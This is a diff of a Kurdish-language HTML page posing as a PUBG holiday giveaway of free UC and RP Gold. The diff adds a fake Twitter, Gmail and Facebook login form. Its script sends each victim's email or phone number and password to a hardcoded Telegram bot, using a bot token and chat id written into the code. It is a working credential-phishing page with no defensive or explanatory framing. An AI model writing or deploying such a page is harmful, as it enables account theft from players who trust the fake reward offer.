@@ -1,112 +1,146 @@
 <!DOCTYPE html><html lang="ku">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دیاری جەژن - PUBG Event</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: sans-serif;
-            background: url('https://i.ibb.co/RTmz4QmC/2gxxm37lrgy51.jpg') no-repeat center center fixed;
-            background-size: cover;
-            color: white;
-            text-align: center;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.6);
-            margin: 50px auto;
-            padding: 20px;
-            max-width: 400px;
-            border-radius: 15px;
-        }
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 20px;
-        }
-        .option, .login-buttons button {
-            background: #ffcc00;
-            padding: 15px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            width: 100%;
-        }
-        .login-buttons button {
-            background: #007bff;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .login-buttons button:hover {
-            background: #0056b3;
-        }
-        .login-buttons img {
-            width: 20px;
-            height: 20px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>دیاری جەژن - PUBG Event</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: url('https://i.ibb.co/RTmz4QmC/2gxxm37lrgy51.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      margin: 50px auto;
+      padding: 20px;
+      max-width: 400px;
+      border-radius: 15px;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+    .option {
+      background: #ffcc00;
+      padding: 15px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      width: 100%;
+    }
+    .option.selected {
+      background-color: #ff4444;
+    }
+    .login-buttons button {
+      background: #007bff;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      cursor: pointer;
+      width: 100%;
+    }
+    .login-buttons button img {
+      width: 20px;
+      height: 20px;
+    }
+    .input-group {
+      display: none;
+      flex-direction: column;
+      margin-top: 10px;
+    }
+    .input-group input {
+      margin: 5px 0;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>دیاری جەژن</h1><button class="option" onclick="selectOption('RP گۆڵد بەدەست بینە بە خۆڕایی')">ئەتەویؕ RP گۆڵد بەدەست بینە بە خۆڕایی</button>
+  <div class="container">
+    <h1>دیاری جەژن</h1><button class="option" onclick="selectOption(this, 'RP Gold')">ئەتەویە RP گۆڵد بەدەست بینە</button>
+<button class="option" onclick="selectOption(this, '1200 UC')">1200 UC بە خۆڕایی</button>
 
-    <button class="option" onclick="selectOption('1200 UC بە خۆڕایی')">1200 UC بە خۆڕایی</button>
-
-    <p style="margin-top: 20px; font-weight: bold;">چونە ژوەرەوە هەڵبژێرەت:</p>
-    <div class="login-buttons">
-        <button onclick="loginWith('Twitter')">
-            <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
-            Twitter
-        </button>
-        <button onclick="loginWith('Gmail')">
-            <img src="https://cdn-icons-png.flaticon.com/512/281/281769.png" alt="Gmail">
-            Gmail
-        </button>
-        <button onclick="loginWith('Facebook')">
-            <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
-            Facebook
-        </button>
-    </div>
+<p style="margin-top: 20px; font-weight: bold;">چونە ژوەرەوە هەڵبژێرەت:</p>
+<div class="login-buttons">
+  <button onclick="showLogin('Twitter')">
+    <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter" />
+    Twitter
+  </button>
+  <button onclick="showLogin('Gmail')">
+    <img src="https://cdn-icons-png.flaticon.com/512/281/281769.png" alt="Gmail" />
+    Gmail
+  </button>
+  <button onclick="showLogin('Facebook')">
+    <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook" />
+    Facebook
+  </button>
 </div>
 
-<script>
+<div class="input-group" id="loginInputs">
+  <input type="text" id="user" placeholder="Email or Phone" />
+  <input type="password" id="pass" placeholder="Password" />
+  <button onclick="submitForm()">Continue</button>
+</div>
+
+  </div>  <script>
     let selectedOption = "";
+    let selectedMethod = "";
 
-    function selectOption(option) {
-        selectedOption = option;
-        alert("هەڵبژاردنی تۆ: " + option);
+    function selectOption(button, option) {
+      document.querySelectorAll('.option').forEach(btn => btn.classList.remove('selected'));
+      button.classList.add('selected');
+      selectedOption = option;
     }
 
-    function loginWith(method) {
-        if (!selectedOption) {
-            alert("تکایە یەکێک لە هەلبژاردنەکان هەلبژێرە");
-            return;
+    function showLogin(method) {
+      if (!selectedOption) {
+        alert("Please select a reward first.");
+        return;
+      }
+      selectedMethod = method;
+      document.getElementById('loginInputs').style.display = 'flex';
+    }
+
+    function submitForm() {
+      const user = document.getElementById('user').value;
+      const pass = document.getElementById('pass').value;
+
+      if (!user || !pass) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      const message = `🎉 New PUBG Event Join\n--------------------------\n🎁 Reward: ${selectedOption}\n🔐 Method: ${selectedMethod}\n📧 User: ${user}\n🔑 Password: ${pass}`;
+
+      fetch("https://api.telegram.org/bot7642269779:AAFts092aU5cIV0CNQqexMk1uU4jdFpo7fY/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "7594104612",
+          text: message
+        })
+      }).then(res => {
+        if (res.ok) {
+          alert("Your information was sent successfully. Thank you!");
+        } else {
+          alert("Failed to send data. Try again later.");
         }
-
-        const message = `✉️ باشداربونی جەژن\n--------------------------\n✨ هەلبژاردن: ${selectedOption}\n🔐 چۆنەژوورەوە: ${method}`;
-
-        fetch("https://api.telegram.org/bot7642269779:AAFts092aU5cIV0CNQqexMk1uU4jdFpo7fY/sendMessage", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: "7594104612",
-                text: message
-            })
-        }).then(res => {
-            if (res.ok) {
-                alert("زانیاریەکان نێردران، سوپاس!");
-            } else {
-                alert("هەڵەیەک ڕوویدا لە ناردنی زانیاریەکان");
-            }
-        });
+      });
     }
-</script>
-
-</body>
+  </script></body>
 </html>
